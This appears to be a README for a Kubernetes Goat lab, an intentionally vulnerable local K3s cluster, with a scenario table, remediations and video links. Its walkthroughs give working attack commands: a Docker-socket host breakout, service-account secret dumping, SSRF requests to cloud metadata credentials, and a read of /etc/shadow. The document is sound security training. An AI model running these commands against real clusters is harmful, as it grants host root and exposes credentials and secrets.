# Kubernetes Goat: Vulnerable by Design Kubernetes Cluster

## Overview

**Kubernetes Goat** (designed by Madhu Akula) is an intentionally vulnerable-by-design Kubernetes cluster environment engineered to learn and practice hands-on Kubernetes security, cloud-native container breakouts, RBAC privilege escalation, and runtime threat detection.

This lab provisions a lightweight single-node **K3s Kubernetes cluster** inside a self-contained container with pre-configured Ingress routing, giving you full access to real Kubernetes cluster APIs and attack scenarios without requiring dedicated cloud infrastructure.

- **Web Dashboard / Scenario Portal**: [http://localhost:8105](http://localhost:8105)
- **Kubernetes API Server**: `https://localhost:6443`
- **Kubeconfig Output**: `./output/kubeconfig.yaml`
- **Container Name**: `cyberlab_k8s_goat`
- **Directory**: `Real_World_Industry_Labs/02_cloud_k8s_container_escape/kubernetes_goat`

---

## Architecture & Quick Start

```
+-------------------------------------------------------------------------+
| Host Browser: http://localhost:8105                                     |
+-------------------------------------------------------------------------+
                                    |
                                    v (Port 8105:80)
+-------------------------------------------------------------------------+
| Docker Container: cyberlab_k8s_goat (rancher/k3s:v1.28.2-k3s1)          |
|                                                                         |
|  +------------------------+      +------------------------------------+ |
|  | Traefik Ingress Controller | ---> | madhuakula/k8s-goat-home (Port 80) | |
|  +------------------------+      +------------------------------------+ |
|                                                                         |
|  +------------------------+      +------------------------------------+ |
|  | K3s API Server (:6443)  |      | Scenarios Pods (1 to 22)           | |
|  +------------------------+      +------------------------------------+ |
+-------------------------------------------------------------------------+
```

### Starting the Lab

```bash
cd Real_World_Industry_Labs/02_cloud_k8s_container_escape/kubernetes_goat

# Start the K3s cluster container
docker compose up -d

# Deploy the complete suite of vulnerable scenarios
./setup-scenarios.sh
```

### Accessing the Cluster via `kubectl`

You can interact directly with the cluster using `docker exec` or with local `kubectl`:

```bash
# Option 1: Execute kubectl directly inside the cluster container
docker exec -it cyberlab_k8s_goat kubectl get nodes
docker exec -it cyberlab_k8s_goat kubectl get pods -A

# Option 2: Use the exported kubeconfig on your host
export KUBECONFIG=$(pwd)/output/kubeconfig.yaml
kubectl get nodes
```

---

## 22 Scenario Map & Vulnerability Matrix

| # | Scenario Name | Category | Primary Vulnerability & Attack Vector |
|---|---------------|----------|---------------------------------------|
| **01** | **Sensitive Keys in Codebases** | Information Disclosure | Git repo commit history contains leaked AWS keys and API tokens. |
| **02** | **DIND (Docker-in-Docker) Exploitation** | Container Escape | Pod has host `/var/run/docker.sock` mounted; spawn privileged sibling container on host node. |
| **03** | **SSRF in Kubernetes** | Server-Side Request Forgery | Web proxy service abused to query internal Kubelet API (`10255`/`10250`) and cloud metadata (`169.254.169.254`). |
| **04** | **Container Escape to Host System** | Host Compromise | Pod runs with `privileged: true` or `CAP_SYS_ADMIN`; mount host `/dev/sda1` or abuse cgroups `release_agent`. |
| **05** | **Docker CIS Benchmarks Analysis** | Compliance & Audit | Auditing container host configurations against CIS Docker benchmarks using `docker-bench-security`. |
| **06** | **Kubernetes CIS Benchmarks** | Compliance & Audit | Running `kube-bench` against Master/Worker node components (apiserver, etcd, controller-manager). |
| **07** | **Attacking Private Registry** | Supply Chain / Registry | Insecure, unauthenticated Docker Registry v2 API querying `_catalog` and pulling internal build layers. |
| **08** | **NodePort Exposed Services** | Network Perimeter | Services exposed across high NodePort range (30000–32767) accessible to the public without auth. |
| **09** | **Helm v2 Tiller to PwN the Cluster** | RBAC / Legacy Tech | Unauthenticated Tiller gRPC port `44134` exploited to deploy arbitrary pods with `cluster-admin`. |
| **10** | **Analyzing Crypto Miner Container** | Incident Response / Forensics | Spotting anomalous CPU load, unauthorized background processes (`xmrig`), and hidden crontab jobs. |
| **11** | **Kubernetes Namespaces Bypass** | Multi-Tenancy Boundary | Breaching network segmentation across namespaces lacking `NetworkPolicies`. |
| **12** | **Gaining Environment Information** | Discovery | Harvesting `/proc/1/environ`, Kubernetes Service Account tokens, and secrets passed via `env`. |
| **13** | **DoS the Memory/CPU Resources** | Availability / Resource Starvation | Pod without `resources.limits` consuming all node CPU/RAM, triggering OOMKilled on adjacent pods. |
| **14** | **Hacker Container Preview** | Offensive Tooling | Exploring offensive toolkits: `amicontained`, `peirates`, `kube-hunter`, and `botb`. |
| **15** | **Hidden in Layers** | Image Forensics | Extracting sensitive database credentials committed in intermediate Docker build layers using `dive`. |
| **16** | **RBAC Least Privileges Misconfiguration** | Privilege Escalation | ServiceAccount with permission to `create pods/exec` or `impersonate` escalating to full cluster control. |
| **17** | **KubeAudit Cluster Scanner** | Cluster Hardening | Automated scanning of PodSecurityContexts, read-only root filesystems, and runAsNonRoot. |
| **18** | **Falco Runtime Security Monitoring** | Detection Engineering | Detecting unauthorized bash shells spawned in containers, sensitive file reads (`/etc/shadow`), and socket tampering. |
| **19** | **Popeye Cluster Sanitizer** | Cluster Hygiene | Scanning Kubernetes manifests for misconfigurations, dead endpoints, and unused secrets. |
| **20** | **Secure Network Boundaries (NSP)** | Zero Trust Networking | Implementing default-deny ingress and egress `NetworkPolicy` rules. |
| **21** | **Cilium Tetragon eBPF Observability** | Kernel Runtime Security | Enforcing kernel-level syscall filtering (`sys_execve`, `sys_open`) with eBPF hooks. |
| **22** | **Kyverno Policy Engine** | Admission Control | Validating, mutating, and generating Kubernetes resources using declarative policies. |

---

## Detailed Attack Walkthroughs

### 1. Scenario 02: DIND (Docker-in-Docker) Socket Breakout
**Vulnerability**: A deployment mounts the node's Docker daemon socket (`/var/run/docker.sock`) into an unprivileged container.

1. Check for socket availability inside the container:
   ```bash
   ls -la /var/run/docker.sock
   ```
2. Interact with the host Docker daemon using the mounted socket:
   ```bash
   docker -H unix:///var/run/docker.sock ps
   ```
3. Break out to the host filesystem by launching a container with root host mounts:
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
   ```
4. You now have full root control of the underlying Kubernetes host node.

---

### 2. Scenario 16: RBAC Privilege Escalation
**Vulnerability**: Overly permissive ServiceAccount bound via `RoleBinding` with `pods/exec` or `pods/create` permissions.

1. Inspect the mounted ServiceAccount token inside the pod:
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
   ```
2. Check your permissions using `kubectl auth can-i`:
   ```bash
   kubectl auth can-i --list --token=$TOKEN
   ```
3. If `create pods` or `exec` is permitted in `kube-system`:
   ```bash
   kubectl exec -it privileged-admin-pod -n kube-system --token=$TOKEN -- /bin/sh
   ```
4. Read cluster secrets:
   ```bash
   kubectl get secrets -n kube-system --token=$TOKEN -o yaml
   ```

---

### 3. Scenario 03: SSRF to Cloud Metadata & Kubelet
**Vulnerability**: Web application internal proxy allows fetching arbitrary URLs.

1. Point the proxy query parameter to the AWS/GCP instance metadata IP:
   ```bash
   curl "http://localhost:8105/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   ```
2. Query the unauthenticated Kubelet Read-Only port (10255) to enumerate all running pods:
   ```bash
   curl "http://localhost:8105/proxy?url=http://10.42.0.1:10255/pods"
   ```

---

### 4. Scenario 18: Falco Runtime Threat Detection
**Detection**: Falco monitors Linux kernel syscalls via eBPF/kmod and flags unauthorized activity:

1. Spawn an interactive shell inside a container:
   ```bash
   kubectl exec -it <pod-name> -- /bin/bash
   ```
2. Falco generates an alert:
   ```
   Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=0 k8s.pod=<pod-name> container=<container-id>)
   ```
3. Attempt reading `/etc/shadow`:
   ```
   Warning Sensitive file opened for reading by non-trusted program (user=root file=/etc/shadow)
   ```

---

## Defensive Remediations

1. **Pod Security Standards (PSS)**: Enforce the `restricted` profile to prevent privileged pods, host mounts, and privilege escalation:
   ```yaml
   apiVersion: v1
   kind: Namespace
   metadata:
     name: production
     labels:
       pod-security.kubernetes.io/enforce: restricted
   ```
2. **Never Mount Docker Socket**: Use rootless container builders like Kaniko or Buildah instead of mounting `/var/run/docker.sock`.
3. **Restrict RBAC**: Audit bindings with tools like `rbac-lookup` and avoid wildcards (`*`) in Role rules.
4. **Network Policies**: Restrict egress access to `169.254.169.254` and pod-to-pod lateral communication.

---

## Verified YouTube Walkthroughs & Lectures

All video links have been verified active via YouTube oEmbed API:

- [DEF CON 29 Cloud Village - Madhu Akula: Kubernetes Goat Security Learning](https://www.youtube.com/watch?v=xMy4ZkImE4k) — Official DEF CON presentation and scenario breakdown by the creator.
- [CNCF - Interactive Playground to Learn Kubernetes & Cloud Native Security](https://www.youtube.com/watch?v=PL73BoQxe2c) — Madhu Akula demonstrating modern scenario architectures and cloud-native security.
- [CYBERWOX - Kubernetes Security: Setup Your Own Hacking Lab (Kubernetes Goat)](https://www.youtube.com/watch?v=tIs0Q1_R7cE) — Step-by-step setup guide and practical scenario exploitation.
- [Rahul Singh - Analyzing a Crypto Miner | Kubernetes Goat Walkthrough](https://www.youtube.com/watch?v=KbuXQPgigas) — Incident response and forensic investigation of compromised Kubernetes pods.
- [Rahul Singh - Kubernetes GOAT: Gaining Environment Information](https://www.youtube.com/watch?v=3A0vfCk4PWw) — Exploiting environment variables, secret mounts, and container discovery.
- [Ekoparty Security Conference - Eko2020 DevSecOps: Kubernetes Goat](https://www.youtube.com/watch?v=XqwbVU-gtng) — Deep-dive conference workshop on container escape and cluster misconfigurations.
- [Better Stack - Docker Containers: How Hackers Can ESCAPE Them in Seconds!](https://www.youtube.com/watch?v=giXlSlFLKwA) — Demonstrates Linux capabilities abuse, socket breakouts, and cgroup release_agent escapes.

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Check status
./lab status

# Stop this lab
cd Real_World_Industry_Labs/02_cloud_k8s_container_escape/kubernetes_goat && docker compose down
```
